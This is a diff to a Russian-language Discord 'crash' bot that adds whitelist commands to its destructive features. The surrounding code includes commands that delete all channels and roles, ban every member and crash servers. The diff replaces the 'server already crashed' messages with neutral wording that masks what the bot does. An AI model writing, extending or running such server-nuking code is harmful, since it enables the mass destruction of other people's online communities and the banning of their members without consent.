@@ -81,6 +81,48 @@ async def remove_admin(ctx, member: discord.Member):
 #--
 
 @Bot.command()
+async def whitelist_add(ctx, id):
+  with open("authors.json", "r")as f:
+    authors = json.load(f)
+  with open("settings.json", "r")as f:
+    sett = json.load(f)
+  if str(ctx.author.id) in authors:
+    if str(id) in sett["whitelist"]:
+      em = discord.Embed(title = f'{id} уже в белом списке', color=discord.Color.green())
+      await ctx.send(embed = em)
+    else:
+      sett["whitelist"][id] = 1
+      with open("settings.json", "w")as f:
+        json.dump(sett,f)
+      emb = discord.Embed(title = f'{id} добавлен в белый список', color=discord.Color.green())
+      await ctx.send(embed = emb)
+  else:
+    embed = discord.Embed(title = 'Отказано в доступе', color=discord.Color.red())
+    await ctx.send(embed = embed)
+    
+    
+@Bot.command()
+async def whitelist_remove(ctx, id):
+  with open("authors.json", "r")as f:
+    authors = json.load(f)
+  with open("settings.json", "r")as f:
+    sett = json.load(f)
+  if str(ctx.author.id) in authors:
+    if str(id) not in sett["whitelist"]:
+      em = discord.Embed(title = f'{id} отсутствует в белом списке', color=discord.Color.red())
+      await ctx.send(embed = em)
+    else:
+      se = sett["whitelist"]
+      se.pop(str(id))
+      with open("settings.json", "w")as f:
+        json.dump(sett,f)
+      emb = discord.Embed(title = f'{id} убран из белого списка', color=discord.Color.green())
+      await ctx.send(embed = emb)
+  else:
+    embed = discord.Embed(title = 'Отказано в доступе', color=discord.Color.red())
+    await ctx.send(embed = embed)
+
+@Bot.command()
 async def crashed_server_name(ctx, *,text):
   with open("authors.json", "r")as f:
     authors = json.load(f)
@@ -182,9 +224,9 @@ async def delchannels(ctx):
  else:
   if guild.id not in dc:
    dc.append(guild.id)
-   if guild.id in g:
+   if str(guild.id) in sett["whitelist"]:
     await ctx.message.delete()
-    await author.send('Краш невозможен! Сервер в белом списке!')
+    await author.send('Выполнение команды невозможно! Сервер в белом списке!')
    else:
     await ctx.message.delete()
     for i in channels:
@@ -193,7 +235,7 @@ async def delchannels(ctx):
        except:
            pass
   else:
-     await ctx.author.send('Сервер уже крашнут!')
+     await ctx.author.send('Команда уже использовалась!')
 
 @Bot.command()
 async def delroles(ctx):
@@ -209,9 +251,9 @@ async def delroles(ctx):
   g = [747500947911213249,776803884764889128, 764781234810650664]
   if guild.id not in dr:
    dr.append(guild.id)
-   if guild.id in g:
+   if str(guild.id) in sett["whitelist"]:
     await ctx.message.delete()
-    await author.send('Краш невозможен! Сервер в белом списке!')
+    await author.send('Выполнение команды невозможно! Сервер в белом списке!')
    else:
     await ctx.message.delete()
     for i in roles: 
@@ -220,7 +262,7 @@ async def delroles(ctx):
        except:
            pass
   else:
-     await ctx.author.send('Сервер уже крашнут!')
+     await ctx.author.send('Команда уже использовалась!')
 
 @Bot.command()
 async def banall(ctx):
@@ -236,9 +278,9 @@ async def banall(ctx):
   g = [747500947911213249,776803884764889128, 764781234810650664]
   if guild.id not in bl:
    bl.append(guild.id)
-   if guild.id in g:
+   if str(guild.id) in sett["whitelist"]:
     await ctx.message.delete()
-    await author.send('Краш невозможен! Сервер в белом списке!')
+    await author.send('Выполнение команды невозможно! Сервер в белом списке!')
    else:
     await ctx.message.delete()
     for i in members:
@@ -248,7 +290,7 @@ async def banall(ctx):
               except:
                   pass
   else:
-     await ctx.author.send('Сервер уже крашнут!')
+     await ctx.author.send('Команда уже использовалась!')
 
 @Bot.command()
 async def crash(ctx):
@@ -267,9 +309,9 @@ async def crash(ctx):
   g = [747500947911213249,776803884764889128, 764781234810650664]
   if guild.id not in csrl:
    csrl.append(guild.id)
-   if guild.id in g:
+   if str(guild.id) in sett["whitelist"]:
      await ctx.message.delete()
-     await author.send('Краш невозможен! Сервер в белом списке!')
+     await author.send('Выполнение команды невозможно! Сервер в белом списке!')
    else:
     if gid in crserv:
      await ctx.author.send('ЛЯ ТЫ КРЫСА!')
